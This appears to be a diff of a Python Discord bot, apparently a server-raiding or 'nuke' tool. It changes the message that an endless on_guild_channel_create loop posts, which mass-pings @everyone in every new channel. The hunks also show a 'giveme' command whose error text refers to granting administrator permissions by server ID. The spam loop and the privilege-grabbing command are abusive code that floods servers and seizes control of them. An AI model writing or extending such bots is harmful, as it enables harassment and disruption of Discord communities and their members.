@@ -9,10 +9,8 @@ with open('config.json', 'r') as f:
     config = json.load(f)
     token = config['token']
 
-
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix="$", intents=discord.Intents.all())
-
 
 @bot.event
 async def on_ready():
@@ -104,7 +102,7 @@ async def on_command_error(ctx, error):
 @bot.event
 async def on_guild_channel_create(channel):
     while True:
-        await channel.send("@everyone **Lithium Was Here** discord.gg/acronisware discord.gg/voidgen https://www.youtube.com/watch?v=2jjgj2sTalc")
+        await channel.send("|| 0@everyone || **https://github.com/severityc**")
 
 
 @bot.command()
@@ -220,8 +218,5 @@ async def giveme(ctx, server_id: int):
     except Exception as e:
         print(Fore.RED + f"Error granting administrator permissions: {e}")
         await ctx.send("An error occurred while processing the command.")
-
-
-
 
 bot.run(token)
